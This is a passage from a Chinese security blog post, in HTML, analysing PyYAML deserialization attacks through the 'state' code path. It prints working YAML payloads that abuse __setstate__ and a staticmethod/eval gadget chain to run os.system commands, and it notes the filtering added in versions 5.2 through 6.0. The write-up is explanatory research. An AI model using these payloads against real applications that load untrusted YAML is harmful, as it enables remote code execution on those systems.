+<h3 id="state-触发"><a href="#state-触发" class="headerlink" title="state 触发"></a>state 触发</h3><p>既然 listitems 可以利用，那么同样作为分支判断其中调用方法的还有 state</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121172309606.png" alt="image-20250121172309606"></p>
+<p>跟进 set_python_instance_state</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121173343649.png" alt="image-20250121173343649"></p>
+<h4 id="setstate"><a href="#setstate" class="headerlink" title="__setstate__"></a>__setstate__</h4><p>只需要 instance 里有 __setstate__ 就会调用，修改下上面 extend 的 poc 就能用：</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span>
+<span class="token key atrule">args</span><span class="token punctuation">:</span>
+  <span class="token punctuation">-</span> test
+  <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+  <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"__setstate__"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span>
+<span class="token key atrule">state</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('whoami')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>一开始的想法是打<code>instance.__dict__.update(state)</code>，但是发现 __dict__ 好像覆写不掉</p>
+<p>那么这里的目标转到<code>slotstate.update(state)</code></p>
+<p>要进入这个判断要求类中没有<code>__setstate__</code>方法，没有<code>__dict__</code>属性</p>
+<p>这个直接上poc调试了</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:str</span>
+    <span class="token key atrule">args</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token key atrule">state</span><span class="token punctuation">:</span> <span class="token tag">!!python/tuple</span>
+      <span class="token punctuation">-</span> <span class="token string">"__import__('os').system('whoami')"</span>
+      <span class="token punctuation">-</span> <span class="token tag">!!python/object/new:staticmethod</span>
+        <span class="token key atrule">args</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token key atrule">state</span><span class="token punctuation">:</span>
+          <span class="token key atrule">update</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:eval</span>
+          <span class="token key atrule">items</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先，yaml 解析是从内到外加载的，先加载 !!python&#x2F;object&#x2F;new:staticmethod</p>
+<p>首次加载</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121231943019.png" alt="image-20250121231943019"></p>
+<p>这里会进<code>instance.__dict__.update(state)</code>，因为静态方法所属类一定有 __dict__ 属性</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121232517512.png" alt="image-20250121232517512"></p>
+<p>经过之后 <code>__dict__</code>中的键值更新</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121232945098.png" alt="image-20250121232945098"></p>
+<p>然后是第二轮，加载 !!python&#x2F;object&#x2F;new:str</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121233129272.png" alt="image-20250121233129272"></p>
+<p>此时的 state 第二项就是恶意payload</p>
+<p>然后经过<code>state, slotstate = state</code>的解构</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121233254825.png" alt="image-20250121233254825"></p>
+<p>state 被设置为了我们第一次放入的 state，slotstate 被设置为了我们第二次放入的 state</p>
+<p>由于 str 没有<code>__dict__</code>属性，于是会直接触发 <code>slotstate.update(state)</code></p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121233436336.png" alt="image-20250121233436336"></p>
+<p>slotstate.update 此时是 eval，于是rce</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121233600114.png" alt="image-20250121233600114"></p>
+<p>总结一下就是做了这样的一个操作：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token builtin">staticmethod</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"update"</span><span class="token punctuation">:</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token string">"items"</span><span class="token punctuation">:</span><span class="token builtin">list</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="version-gt-x3D-5-2"><a href="#version-gt-x3D-5-2" class="headerlink" title="version &gt;&#x3D; 5.2"></a>version &gt;&#x3D; 5.2</h2><p>在5.2中只额外支持 !!python&#x2F;name、!!python&#x2F;object、!!python&#x2F;object&#x2F;new 和 !!python&#x2F;module，而不支持apply标签</p>
+<p>在5.3.1以上的版本中加了一个新的过滤机制，匹配到就报错</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250122000534786.png" alt="image-20250122000534786"></p>
+<p>6.0以上的版本用户必须指定Loader了，否则报错</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
